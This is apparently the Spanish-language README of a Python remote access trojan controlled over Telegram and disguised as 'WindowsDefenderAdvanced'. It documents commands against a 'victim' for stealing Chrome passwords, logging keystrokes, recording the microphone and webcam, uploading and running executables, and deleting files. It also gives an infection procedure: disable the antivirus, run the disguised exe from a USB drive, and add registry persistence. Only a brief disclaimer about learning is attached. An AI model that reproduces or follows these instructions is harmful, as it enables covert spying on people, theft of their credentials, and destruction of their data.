````
  ╔═══╦═══╦════╗        ╔════╗ ╔╗                ╔╗╔╗╔╗     ╔╗
  ║╔═╗║╔═╗║╔╗╔╗║        ║╔╗╔╗║ ║║                ║║║║║║     ║║
  ║╚═╝║║ ║╠╝║║╚╝╔╗╔╦╦══╗╚╝║║╠╩═╣║╔══╦══╦═╦══╦╗╔╗ ║║║║║╠╦═╗╔═╝╠══╦╗╔╗╔╦══╗
  ║╔╗╔╣╚═╝║ ║║  ║╚╝╠╣╔╗║  ║║║║═╣║║║═╣╔╗║╔╣╔╗║╚╝║ ║╚╝╚╝╠╣╔╗╣╔╗║╔╗║╚╝╚╝║══╣
  ║║║╚╣╔═╗║ ║║  ╚╗╔╣║╔╗║  ║║║║═╣╚╣║═╣╚╝║║║╔╗║║║║ ╚╗╔╗╔╣║║║║╚╝║╚╝╠╗╔╗╔╬══║
  ╚╝╚═╩╝ ╚╝ ╚╝   ╚╝╚╩╝╚╝  ╚╝╚══╩═╩══╩═╗╠╝╚╝╚╩╩╩╝  ╚╝╚╝╚╩╝╚╩══╩══╝╚╝╚╝╚══╝
                                    ╔═╝║                 
                                    ╚══╝                   v 1.0.0
````
[![Made with Python](https://img.shields.io/badge/Made%20with-Python-3572A5.svg)](https://github.com/SebastianEPH)


__Nota:__ Éste proyecto tiene como finalidad el aprendizaje de ciberseguridad y hacking, no me hago responsable de un posible mal uso de ésta herramienta

[Read this documentation in English](Doc/README.md)

# Información Importante
* __Fecha de documentación :__ `07/05/2020`
* __Versión:__ v`1.0.0`
* __Peso compilado:__ `45MB` aproximadamente
* __Versión Python:__ `3.7` (Obligatoriamente debe ser ésta versión)

## Archivos del repositorio - Github 
![Archivos](https://i.imgur.com/G57rYkC.png)
- `Doc`    = Contiene la documentación en ingles
- `Compilar.bat`    = Convierte el archivo `*.py` a `*.exe`
- `Ejecutar.bat`    = Ejecuta el RAT en consola, se muestra una consola.
- `iconDefender.ico`    = Icono Windows Defender
- `LICENCE` = Licencia 
- `proxy.py` = librería `*.py` , _no mover ni modificar_
- `README.md`= Ésta Documentación
- `StartUp.reg` = Modifica el Registro de Windows
- `versionN.txt` = Información detalla de conversión `*.py` a `*.exe`
- `WindowsDefenderAdvanced.py` = Código fuente del RAT via Telegram Windows

# Requerimientos de espacio de trabajo
__Nota:__ Si usted desea puede descargar el entorno virtual de python 3.7 con todas las librerías instaladas y usadas en éste proyecto [_aquí_](https://jxjjxy-my.sharepoint.com/:f:/g/personal/ztjr_7ee_t_odmail_cn/EmlA_2f55ZxPoJh8yPMkvD4BrUNI0rJfjaPBrZP-84sCQw?e=kHqqgE)

__Librerías utilizadas__

* __import__ `winshell`
* __import__ `tendo`
* __import__ `pypiwin32`
* __import__ `pyinstaller`
* __import__ `psutil`
* __import__ `pillow`
* __import__ `opencv-python`
* __import__ `sys`
* __import__ `threading`
* __import__ `datetime`
* __import__ `argparse`
* __import__ `logging`
* __import__ `socket`
* __import__ `select`



# Caracteristicas
## /apagar
`Apaga la computadora de la victima`
## /audio
`Graba desde el microfono [Victima]`

__Ejemplo:__
````
/audio [Tiempo en segundos]
/audio 45
````


## /captura
`Toma una captura de pantalla - [Victima]`
## /ir
`Navega entre carpetas - [Victima]`

__Ejemplo:__
````
/ir [Ruta entre comillas dobles y debe terminar con un "\"]

/ir "D:\SoftwarePortable\Android Studio\plugins\android\resources\installer\arm64-v8a\"
````
## /cmd_dns
`Muestra la información desde la DNS - [Victima]`
## /copiar 
`Copia un archivo de una carpeta a otra - [Victima]`

__Ejemplo:__
````
/copiar [Ruta entre comillas dobles y debe terminar con la extensión del archivo] [Ruta entre comillas dobles y debe terminar con la extensión del archivo]

/copiar  "C:\Users\Anonymous\Documents\virus.exe"   "C:\Users\Anonymous\Desktop\virus.exe"
````

## /descargar
`Descarga un archivo - [Victima]`

__Ejemplo:__
````
/descargar [Ruta entre comillas dobles y debe terminar con la extensión del archivo]

/descargar "O:\OneDrive - xKx\Pictures\Developer Software\Website\logo.png"
````

## /ejecutar
`Ejecuta un EXE - [Victima]`

__Ejemplo:__
````
/ejecutar [Ruta entre comillas dobles y debe terminar con la extensión del archivo]

/ejecutar "C:\Users\Public\virus.exe"
````
## /eliminar
`Elimina un archivo o carpeta - [Victima]`

__Ejemplo:__
````
/eliminar [Ruta entre comillas dobles y debe terminar con un "\" o con la extensión del archivo]

/eliminar "D:\Photos\FotosFamilia\"
/eliminar "D:\Photos\FotosFamilia\03122019.jpg"
````
## /enviar
`Envía archivos de nuestra PC o celular a la [Victima]`

__Ejemplo:__
````
/enviar [Ruta entre comillas dobles y debe terminar con la extensión del archivo] [Ruta entre comillas dobles y debe terminar con la extensión del archivo]

/enviar  "C:\Users\Anonymous\Documents\virus.exe"   "C:\Users\Victima\Documents\NoEsvirus.exe"
````

## /fondo
`Cambia fondo de pantalla - [Victima]`

__Ejemplo:__

````
/fondo   C:/Users/User/Desktop/porn.jpg
````
## /get_chrome
`Obtiene las contraseñas guardadas en Chrome - [Victima]`
## /get_key
`Obtiene el registro de teclas - [Victima]`
## /ip_info
`Obtiene la información desde la IP [Victima]`
## /mover
`Mueve archivos - [Victima]`

__Ejemplo:__
````
/mover [Ruta entre comillas dobles y debe terminar con la extensión del archivo] [Ruta entre comillas dobles y debe terminar con la extensión del archivo]

/mover  "C:\Users\Anonymous\Documents\virus.exe"   "C:\Users\Anonymous\Desktop\virus.exe"
````

## /proxy
`Crea  - [Victima]`

`Creo que abre un puerto a la victima. <= por verificar`
## /red_info
`Muestra información de la red- [Victima]`
## /reiniciar
`Reinicia la computadora - [Victima]`
## /tareas
`Muestra información de procesos  - [Victima]`

![dsf](https://i.imgur.com/miav5Y8.png)

## /test
`Verifica si la [Victima] se encuentra en linea`
## /this
`Muestra la ruta donde se encuentra el RAT`
## /web
`Abre un URL en el navegador predeterminado de `
__Ejemplo:__

````
/web   https://www.youtube.com/watch?v=ywGOLN0dDKU
/web   https://www.xxx.com
````
## /webcam
`Graba o toma foto de la webcam`

__NOTA:__`  No probado, tamboco sé si la luz de la webCam se enciende.`
___
___
# instalación:

__Nota:__ Si usted desea puede descargar el entorno virtual de python 3.7 con todas las librerías instaladas y usadas en éste proyecto [_aquí_](https://jxjjxy-my.sharepoint.com/:f:/g/personal/ztjr_7ee_t_odmail_cn/EmlA_2f55ZxPoJh8yPMkvD4BrUNI0rJfjaPBrZP-84sCQw?e=kHqqgE)

## Conversión de `*.py a *.exe`:
## Método de infección:
___¿Cómo infecto a la victima?___

![Final files](https://i.imgur.com/7GJz3De.png)
- Usten tendrá al finalizar 2 archivos:
- El archivo llamado `WindowsDefender.exe` es el keylogger.
- El archivo llamado , modifica el registro de windows, y hace que el keylogger se ejecute siempre al iniciar el usuario.
___
___

# Procedimiento de infección:
__Nota:__ No cambiar de nombre al archivo `WindowsDefenderAdvanced.exe`, si usted le cambia de nombre, algunas funcionalidades , como la del troyano no se iniciarán.
- Usten guardará esos archivos en un USB
- Es necesario desactivar el antivirus o agregar una exclusión en al siguiente ruta: `"C:\Users\Public\Security\Windows Defender"`
- Lo siguiente es ejecutar el archivo `WindowsDefender.exe` en el USB, el keylogger se replicará en la siguiente ruta `"C:\Users\Public\Security\Windows Defender"`, Se recomienda no sacar el USB al instante ya que el keylogger se estará replicando enla ruta.
- Lo siguiente es darle 2 click al archiv `StartUp.reg`, y ésto hará que el registro de windows sea modificado y el keylogger se ejecute 
- __Nota:__ No hay un orden fijo, usted puede ejecutar primero el archivo `WindowsDefender.exe` cómo el archivo `StartUp.reg` y  ésto no causará ningún problema.

___
___
# Creador 
* __Repositorio Original:__ [mvrozanti](https://github.com/mvrozanti/RAT-via-Telegram) <== Es el creador original de éste repositorio.
* __Repostitorio:__ [Keylogger_Python](https://github.com/SebastianEPH/Keylogger_Python) <== Éste repositorio fue integrado en su totalidad dentro de [RAT_via_Telegram_Windows](https://github.com/SebastianEPH/RAT_via_Telegram_Windows).
## By SebastianEPH
- [Github](https://github.com/SebastianEPH)
- [Facebook](https://www.facebook.com/SebastianEPH)
- [Linkedin](https://www.linkedin.com/in/sebastianeph/)
- [Telegram](https://t.me/sebastianeph)